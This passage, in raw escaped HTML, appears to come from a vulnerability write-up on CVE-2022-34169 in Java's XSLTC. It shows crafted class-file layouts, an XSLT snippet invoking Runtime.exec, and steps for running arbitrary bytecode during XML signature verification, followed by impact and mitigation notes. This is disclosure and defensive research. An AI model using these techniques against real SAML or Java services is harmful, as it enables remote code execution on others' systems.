font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; 0xAA 0xAA&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONST_DOUBLE: &lt;/span&gt;&lt;span style=\"background-color: #c9daf8; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"center\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;col width=\"333\"&gt;&lt;/col&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fce5cd; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;First Method Header&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;access_flags 0x0601&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #38761d; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;name_index&amp;nbsp; 0xXXXX&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;desc_index 0xYYYY&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #9900ff; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;attr_count 0x0001&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 20pt;\"&gt;&lt;td rowspan=\"3\" style=\"background-color: #fce5cd; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Attribute [0]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;name_index 0xZZ06&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;length 0x00000005&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;data &amp;nbsp; “\\x00\\x00\\x00\\x00\\x06”&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 20pt;\"&gt;&lt;/tr&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;/tr&gt;&lt;tr style=\"height: 20pt;\"&gt;&lt;td style=\"background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Second Method Header&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: red; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;access_flags 0x0001&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;name_index&amp;nbsp; 0xCCCC -&amp;gt; &amp;lt;init&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #4a86e8; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;desc_index 0xDDDD&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #ff9900; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp; -&amp;gt; ()V&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #9900ff; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;attr_count 0x0003&lt;/span&gt;&lt;span style=\"background-color: transparent; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 20pt;\"&gt;&lt;td style=\"background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Attribute [0]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;name_index 0x0600&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;length 0x00000004&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;data &amp;nbsp; “\\x00\\x00\\x00\\x06&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 20pt;\"&gt;&lt;td style=\"background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Attribute [1]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: magenta; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;name_index 0xCCDD -&amp;gt; Code&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #0d904f; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;length 0xZZZZZZZZ&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #c53929; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;data&amp;nbsp; PAYLOAD&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 20pt;\"&gt;&lt;td style=\"background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Attribute [2] ...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;We still need to bypass one limitation: JVM bytecode does not work standalone, but references and relies on entries in the constant pool. Instantiating a class or calling a method requires a corresponding constant entry in the pool. This is a problem as our bug doesn’t give us the ability to create fake constant pool entries so we are limited to constants that XSLTC adds during compilation.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Luckily, there is a way to add arbitrary class and method references to the constant pool: Java’s XSLT runtime supports calling arbitrary Java methods. As this is clearly insecure, this functionality is protected by a runtime setting and always disabled during signature verification.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;However, XSLTC will still process and compile these function calls when processing a stylesheet and the call will only be blocked during runtime (see the corresponding code in &lt;/span&gt;&lt;a href=\"https://github.com/openjdk/jdk/blob/aff5ff14b208b3c2be93d7b4fab8b07c5be12f3e/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/compiler/FunctionCall.java#L787\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;FunctionCall.java&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;). This means that we can get references to all required methods and classes by adding a XSLT element like the one shown below:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 0pt;\"&gt;&lt;td style=\"background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;lt;xsl:value-of&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; select&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"rt:exec(rt:getRuntime(),'...')\" xmlns:rt&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\"java.lang.Runtime\"&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;There are two final checks we need to bypass, before we end up with a working class file:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;\"&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The JVM enforces that every constructor of a subclass, calls a superclass constructor before returning. This check can be bypassed by never returning from our constructor either by adding an endless loop at the end or throwing an exception, which is the approach I used in my exploit Proof-of-Concept. A slightly more complex, but cleaner approach is to add a reference to the AbstractTranslet constructor to the object pool and call it. This is the approach used by thanat0s in their &lt;/span&gt;&lt;a href=\"https://noahblog-360-cn.translate.goog/xalan-j-integer-truncation-reproduce-cve-2022-34169/?_x_tr_sch=http&amp;amp;_x_tr_sl=auto&amp;amp;_x_tr_tl=en&amp;amp;_x_tr_hl=de&amp;amp;_x_tr_pto=wapp\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;exploit writeup&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Finally, we need to skip over the rest of XSLTC’s output. This can be done by constructing a single large attribute with the right size as an element in the class attribute table.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Once we chain all of this together we end up with a signed XML document that can trigger the execution of arbitrary JVM bytecode during signature verification. I’ve skipped over some implementation details of this exploit, so if you want to reproduce this vulnerability please take a look at the heavily commented&amp;nbsp; &lt;/span&gt;&lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=553654\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;proof-of-concept&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; script.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Impact and Restrictions&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;In theory every unpatched Java application that processes XML signatures is vulnerable to this exploit. However, there are two important restrictions:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;As references are only processed after the signature of the &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SignedInfo&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; element is verified, applications can be protected based on their usage of the &lt;/span&gt;&lt;a href=\"https://docs.oracle.com/en/java/javase/18/security/java-xml-digital-signature-api-overview-and-tutorial.html#GUID-26946ED1-1BBE-4AFD-B1CA-5A6A46FD7354:~:text=validity%20status%3A%20%22%20%2B%20refValid)%3B%0A%20%20%20%20%7D-,Using%20KeySelectors,-KeySelectors%20are\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;KeySelector&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; class. Applications that use a allowlist of trusted keys in their &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KeySelector&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; will be protected as long as these keys are not compromised. An example of this would be a single-tenant SAML SP configured with a single trusted IdP key. In practice, a lot of these applications are still vulnerable as they don’t use &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KeySelector&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; directly and will instead enforce this restriction in their own application logic after an unrestricted signature validation. At this point the vulnerability has already been triggered. Multi-tenant SAML applications that support customer-provided Identity Providers, as most modern cloud SaaS do, are also not protected by this limitation.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SAML Identity Providers can only be attacked if they support (and verify) signed SAML requests.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Even without CVE-2022-34169, processing XSLT during signature verification can be easily abused as part of a DoS attack. For this reason, the property &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;org.jcp.xml.dsig.secureValidation&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; can be enabled to forbid XSLT transformation in XML signatures. Interestingly this property defaults to false for all JDK versions &amp;lt;17, if the application is not running under the Java security manager. As the Security Manager is rarely used for server side applications and JDK 17 was only released a year ago, we expect that a lot of applications are not protected by this. Limited testing of large java-based SSO providers confirmed this assumption. Another reason for a lack of widespread usage might be that &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;org.jcp.xml.dsig.secureValidation&lt;/span&gt;&lt;span 